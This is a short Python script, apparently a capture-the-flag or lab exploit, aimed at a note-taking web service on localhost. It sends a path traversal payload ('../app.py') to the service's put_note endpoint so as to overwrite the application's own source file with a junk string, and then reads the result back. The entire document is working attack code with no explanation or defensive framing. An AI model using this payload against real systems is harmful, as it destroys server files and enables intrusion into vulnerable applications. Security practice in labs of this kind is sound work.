import requests

URL = "http://localhost:1337"

class Exploit():
    def overwrite_file(file):
        payload = {"name": f"../{file}", "value": "you are stupid!!"}
        response = requests.post(f"{URL}/put_note", json=payload)
        response = requests.post(f"{URL}/get_note", json=payload)
        print("Response:", response.text)
        print("file overwritten")


Exploit.overwrite_file("app.py")